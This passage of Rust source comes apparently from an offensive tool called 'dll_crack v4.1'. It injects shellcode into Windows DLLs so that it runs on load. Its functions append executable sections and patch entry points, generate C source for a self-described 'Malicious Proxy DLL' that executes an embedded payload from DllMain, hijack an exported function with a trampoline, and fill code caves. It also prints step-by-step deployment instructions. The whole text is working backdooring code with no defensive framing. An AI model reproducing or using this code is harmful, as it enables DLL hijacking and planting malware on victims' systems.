        if jmp_rel >= -(1i64<<31) && jmp_rel < (1i64<<31) {
            data[ep] = 0xE9;
            data[ep+1..ep+5].copy_from_slice(&(jmp_rel as i32).to_le_bytes());
        }
    }

    let out_path = output.unwrap_or(dll_path);
    std::fs::write(out_path, &data).map_err(|e| format!("写入: {}", e))?;

    Ok(format!("═══ DLL加料完成 ═══\n  文件: {}\n  备份: {}\n  Shellcode: {}B @RVA 0x{:08X}\n  入口JMP: DllMain→shellcode\n  [+] DLL被加载时自动执行shellcode!",
        out_path, bak, sc.len(), if let Some(ep) = entry_off { new_va } else { 0 }))
}

// ═══════════════ 恶意代理DLL生成 v4.1 ═══════════════

fn spike_proxy_gen(target_dll: &str, shellcode_hex: &str, output_dir: Option<&str>) -> Result<String, String> {
    let sc = resolve_payload(shellcode_hex)?;
    let dll_path = std::path::Path::new(target_dll);
    let dll_name = dll_path.file_name().unwrap_or_default().to_string_lossy();
    let base = dll_name.replace(".dll","").replace(".DLL","");
    let orig = format!("{}_orig.dll", base);

    // Parse exports
    let data = std::fs::read(target_dll).map_err(|e| format!("读取: {}", e))?;
    let mut exports = Vec::new();
    if data.len() >= 64 && u16_le(&data,0)==0x5A4D {
        let po = u32_le(&data,0x3C) as usize;
        let co = po+4; let opt = co+20; let magic = u16_le(&data,opt);
        let dd = opt + if magic==0x20B{112}else{96};
        let exp_rva = u32_le(&data,dd);
        if exp_rva > 0 {
            let ns = u16_le(&data,co+2) as usize;
            let ss = co+20+u16_le(&data,co+16) as usize;
            let mut secs = Vec::new();
            for i in 0..ns {
                let o = ss+i*40;
                secs.push((String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string(),
                    u32_le(&data,o+12),u32_le(&data,o+8),u32_le(&data,o+20),u32_le(&data,o+16)));
            }
            for (_,va,vs,ro,rs) in &secs {
                if exp_rva>=*va && exp_rva<va+(*vs).max(*rs) && *rs>0 {
                    if let Ok((_,ef)) = parse_exports(&data, (ro+(exp_rva-va)) as usize, &secs.iter().map(|(n,v,vs,r,s)| (n.clone(),*v,*vs,*r,*s,0u32)).collect::<Vec<_>>()) {
                        exports = ef;
                    }
                }
            }
        }
    }

    let sc_hex: String = sc.iter().map(|b| format!("0x{:02X},",b)).collect();

    let mut code = format!(r#"// Malicious Proxy DLL for {} — Auto-generated by dll_crack v4.1
// Original DLL → {} | Proxy with embedded shellcode
#include <windows.h>

// Embedded shellcode
unsigned char payload[] = {{ {} }};
unsigned int payload_len = {};

void ExecutePayload() {{
    void* exec = VirtualAlloc(0, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec) {{
        memcpy(exec, payload, payload_len);
        ((void(*)())exec)();
    }}
}}

"#, dll_name, orig, sc_hex, sc.len());

    // Export forwarders
    for (_, name) in &exports {
        if !name.starts_with("Ordinal_") {
            code.push_str(&format!("#pragma comment(linker, \"/export:{}={}.{}\")\n", name, orig.replace(".dll",""), name));
        }
    }

    code.push_str(&format!(r#"
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        DisableThreadLibraryCalls(hinst);
        ExecutePayload(); // [!] Payload executes here!
    }}
    return TRUE;
}}
"#));

    let out_dir = output_dir.unwrap_or(".");
    let out_p = std::path::Path::new(out_dir);
    let _ = std::fs::create_dir_all(out_p);
    let c_path = out_p.join(format!("{}_malproxy.c", base));
    std::fs::write(&c_path, &code).map_err(|e| format!("写入: {}", e))?;

    Ok(format!("═══ 恶意代理DLL生成 ═══\n  目标: {}\n  导出: {}函数转发\n  Payload: {}B\n  源码: {}\n\n  使用方法:\n  1. rename {} → {}\n  2. cl /LD {} /Fe:{}\n  3. 放置代理DLL到目标目录",
        dll_name, exports.len(), sc.len(), c_path.display(), dll_name, orig, c_path.display(), dll_name))
}

// ═══════════════ 导出劫持加料 v4.1 ═══════════════

fn spike_export_hijack(dll_path: &str, func_name: &str, shellcode_hex: &str) -> Result<String, String> {
    let mut data = std::fs::read(dll_path).map_err(|e| format!("读取: {}", e))?;
    let sc = resolve_payload(shellcode_hex)?;
    let bak = format!("{}.exphijack_bak", dll_path);
    std::fs::copy(dll_path, &bak).map_err(|_| "备份失败".to_string())?;

    if data.len() < 64 { return Err("非PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dd = opt_start + if is_x64 { 112 } else { 96 };
    let exp_rva = u32_le(&data, dd);
    if exp_rva == 0 { return Err("无导出表".into()); }

    let ns = u16_le(&data, coff+2) as usize;
    let ss = coff+20+u16_le(&data, coff+16) as usize;
    let mut secs = Vec::new();
    for i in 0..ns {
        let o = ss+i*40;
        secs.push((u32_le(&data,o+12),u32_le(&data,o+8),u32_le(&data,o+20),u32_le(&data,o+16)));
    }

    // Find export function RVA
    let (exp_off, funcs) = {
        let mut off = None;
        for &(va,vs,ro,rs) in &secs {
            if exp_rva>=va && exp_rva<va+vs.max(rs) && rs>0 { off=Some((ro+(exp_rva-va))as usize); break; }
        }
        let eo = off.ok_or("无法定位导出表")?;
        let secs_str: Vec<(String,u32,u32,u32,u32,u32)> = secs.iter().enumerate().map(|(i,&(v,vs,r,rs))| (format!("s{}",i),v,vs,r,rs,0)).collect();
        (eo, parse_exports(&data, eo, &secs_str).map(|(_,f)| f).unwrap_or_default())
    };

    // Find target function
    let target_rva: u32 = if func_name == "*" {
        // Pick first named export
        funcs.iter().find(|(_,n)| !n.starts_with("Ordinal_") && !n.contains('.')).map(|(ord,_)| {
            // Get RVA from EAT
            let eat_rva = u32_le(&data, exp_off + 28);
            let _ = eat_rva;
            0 // Placeholder — needs RVA lookup from ordinal
        }).unwrap_or(0)
    } else {
        0 // Need to look up by name
    };

    // Simplified: find any export, patch its code start
    // Use first export's RVA from AddressOfFunctions array
    let eat_rva = u32_le(&data, exp_off + 28);
    let num_funcs = u32_le(&data, exp_off + 20) as usize;
    let eat_off = {
        let mut o = None;
        for &(va,vs,ro,rs) in &secs {
            if eat_rva>=va && eat_rva<va+vs.max(rs) && rs>0 { o=Some((ro+(eat_rva-va))as usize); break; }
        }
        o
    }.ok_or("EAT定位失败")?;

    if eat_off + 4 > data.len() || num_funcs == 0 { return Err("EAT空".into()); }
    let first_func_rva = u32_le(&data, eat_off);

    // Find file offset of first function
    let func_file_off = {
        let mut o = None;
        for &(va,vs,ro,rs) in &secs {
            if first_func_rva>=va && first_func_rva<va+vs.max(rs) && rs>0 { o=Some((ro+(first_func_rva-va))as usize); break; }
        }
        o.ok_or("函数偏移定位失败")?
    };

    // Add spike section with shellcode + trampoline
    let section_align = u32_le(&data, opt_start+32) as usize;
    let file_align = u32_le(&data, opt_start+36) as usize;
    let num_sections = u16_le(&data, coff+2) as usize;
    let last = ss + (num_sections-1)*40;
    let lva = u32_le(&data, last+12) as usize;
    let lvs = u32_le(&data, last+8) as usize;
    let lro = u32_le(&data, last+20) as usize;
    let lrs = u32_le(&data, last+16) as usize;
    let nva = ((lva+lvs+section_align-1)/section_align)*section_align;
    let nro = ((lro+lrs+file_align-1)/file_align)*file_align;

    // Build trampoline: shellcode + jmp back to original func
    let mut trampoline = sc.clone();
    // Add JMP rel32 back to original function
    trampoline.push(0xE9);
    let back_rel = (first_func_rva as i64 - (nva as i64 + sc.len() as i64 + 5)) as i32;
    trampoline.extend_from_slice(&back_rel.to_le_bytes());

    let raw_sz = ((trampoline.len()+file_align-1)/file_align)*file_align;
    let req = nro + raw_sz;
    if req > data.len() { data.resize(req, 0); }
    data[nro..nro+trampoline.len()].copy_from_slice(&trampoline);

    // Add section header
    let nso = ss + num_sections*40;
    if nso+40 > data.len() { data.resize(nso+40,0); }
    data[nso..nso+8].copy_from_slice(b".spkhk\0\0");
    let vsz = ((trampoline.len()+section_align-1)/section_align)*section_align;
    data[nso+8..nso+12].copy_from_slice(&(vsz as u32).to_le_bytes());
    data[nso+12..nso+16].copy_from_slice(&(nva as u32).to_le_bytes());
    data[nso+16..nso+20].copy_from_slice(&(raw_sz as u32).to_le_bytes());
    data[nso+20..nso+24].copy_from_slice(&(nro as u32).to_le_bytes());
    data[nso+36..nso+40].copy_from_slice(&0xE0000020u32.to_le_bytes());

    // Patch original function: JMP to trampoline
    data[func_file_off] = 0xE9;
    let jmp_rel = (nva as i64 - (first_func_rva as i64 + 5)) as i32;
    data[func_file_off+1..func_file_off+5].copy_from_slice(&jmp_rel.to_le_bytes());

    // Update PE headers
    data[coff+2..coff+4].copy_from_slice(&((num_sections+1) as u16).to_le_bytes());
    data[opt_start+56..opt_start+60].copy_from_slice(&((nva+vsz) as u32).to_le_bytes());

    std::fs::write(dll_path, &data).map_err(|e| format!("写入: {}", e))?;

    Ok(format!("═══ 导出劫持加料完成 ═══\n  文件: {}\n  备份: {}\n  劫持函数RVA: 0x{:08X}\n  Trampoline: {}B @RVA 0x{:08X}\n  [+] 调用导出函数→执行shellcode→跳回原函数!",
        dll_path, bak, first_func_rva, trampoline.len(), nva))
}

// ═══════════════ 代码洞填充 v4.1 ═══════════════

fn spike_cave_stuff(dll_path: &str, shellcode_hex: &str) -> Result<String, String> {
    let mut data = std::fs::read(dll_path).map_err(|e| format!("读取: {}", e))?;
    let sc = resolve_payload(shellcode_hex)?;
    let bak = format!("{}.cave_bak", dll_path);
    std::fs::copy(dll_path, &bak).map_err(|_| "备份失败".to_string())?;

    if data.len() < 64 || u16_le(&data,0)!=0x5A4D { return Err("非PE".into()); }
    let pe_off = u32_le(&data,0x3C) as usize;
    let coff = pe_off+4;
    let opt = coff+20;
    let magic = u16_le(&data,opt);
    let is_x64 = magic==0x20B;
    let entry = if is_x64 {u64_le(&data,opt+16)}else{u32_le(&data,opt+16)as u64};
    let ns = u16_le(&data,coff+2) as usize;
    let ss = coff+20+u16_le(&data,coff+16) as usize;

    // Find best code cave in .text or CODE section
    let mut best_cave: Option<(usize, usize, u32)> = None; // file_offset, size, rva
    for i in 0..ns {
        let o = ss+i*40;
        let name = String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string();
        let flags = u32_le(&data, o+36);
        if flags & 0x20000000 == 0 { continue; } // 可执行
        let rsize = u32_le(&data, o+16) as usize;
        let roff = u32_le(&data, o+20) as usize;
        let vaddr = u32_le(&data, o+12);
        if rsize == 0 { continue; }

        let mut start: Option<usize> = None;
        for j in 0..rsize {
            if data[roff+j] == 0x00 || data[roff+j] == 0xCC {
                if start.is_none() { start = Some(j); }
            } else {
                if let Some(s) = start {
                    let len = j - s;
                    if len >= sc.len() + 5 {
                        best_cave = Some((roff+s, len, vaddr+s as u32));
                        break;
                    }
                    start = None;
                }
            }
        }
        if best_cave.is_some() { break; }
        if let Some(s) = start {
            let len = rsize - s;
            if len >= sc.len() + 5 { best_cave = Some((roff+s, len, vaddr+s as u32)); break; }
        }
    }

    let (cave_off, cave_size, cave_rva) = best_cave.ok_or("无足够大的代码洞".to_string())?;

    // Patch entry point: JMP to cave
    let entry_off = {
        let mut o = None;
        for i in 0..ns {
            let so = ss+i*40;
            let va = u32_le(&data,so+12);
            let vs = u32_le(&data,so+8);
            let ro = u32_le(&data,so+20);
            let rs = u32_le(&data,so+16);
            if entry>=va as u64 && entry<va as u64+vs as u64 && rs>0 {
                o = Some((ro as usize+(entry as usize-va as usize))as usize); break;
            }
        }
        o.ok_or("入口点定位失败")?
    };

    // Save original entry bytes
    let orig_entry_bytes = data[entry_off..entry_off+5].to_vec();

    // Write: shellcode + 还原序言 + JMP回原入口+5
    let mut payload = sc.clone();
    payload.extend_from_slice(&orig_entry_bytes); // 执行被覆盖的入口序言
    payload.push(0xE9); // JMP回 entry+5
    let back = entry as i64 + 5 - (cave_rva as i64 + payload.len() as i64);
    payload.extend_from_slice(&(back as i32).to_le_bytes());

    if payload.len() > cave_size { return Err(format!("Cave太小: {}B needed, {}B available", payload.len(), cave_size)); }

    data[cave_off..cave_off+payload.len()].copy_from_slice(&payload);

    // Patch entry: JMP to cave
    data[entry_off] = 0xE9;
    let jmp_rel = cave_rva as i64 - (entry as i64 + 5);
    data[entry_off+1..entry_off+5].copy_from_slice(&(jmp_rel as i32).to_le_bytes());

    std::fs::write(dll_path, &data).map_err(|e| format!("写入: {}", e))?;

    Ok(format!("═══ 代码洞填充完成 ═══\n  文件: {}\n  备份: {}\n  Cave: 0x{:08X} ({}B→{}B payload)\n  入口→Cave→Shellcode→原序言→返回\n  [+] DLL加载时自动执行shellcode!",
        dll_path, bak, cave_rva, cave_size, payload.len()))
}

// ═══════════════ 辅助函数 ═══════════════

fn simple_base64(data: &[u8]) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(data.len() * 4 / 3 + 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(TABLE[(triple >> 18) as usize & 0x3F] as char);
        out.push(TABLE[(triple >> 12) as usize & 0x3F] as char);
        if chunk.len() > 1 { out.push(TABLE[(triple >> 6) as usize & 0x3F] as char); }
        else { out.push('='); }
        if chunk.len() > 2 { out.push(TABLE[triple as usize & 0x3F] as char); }
        else { out.push('='); }
    }
    out
}

fn rva_to_offset(sections: &[(String, usize, usize, usize, usize, u32)], rva: usize) -> Option<usize> {
    for (_, vaddr, vsize, roff, rsize, _) in sections {
        let max_size = (*vsize).max(*rsize);
        if rva >= *vaddr && rva < *vaddr + max_size {
            let delta = rva - *vaddr;
            if *rsize > 0 && delta < *rsize {
                return Some(*roff + delta);
            }
        }
    }
    None
}

fn read_cstr(data: &[u8], offset: usize) -> String {
    let mut end = offset;
    while end < data.len() && data[end] != 0 { end += 1; }
    String::from_utf8_lossy(&data[offset..end]).to_string()
}
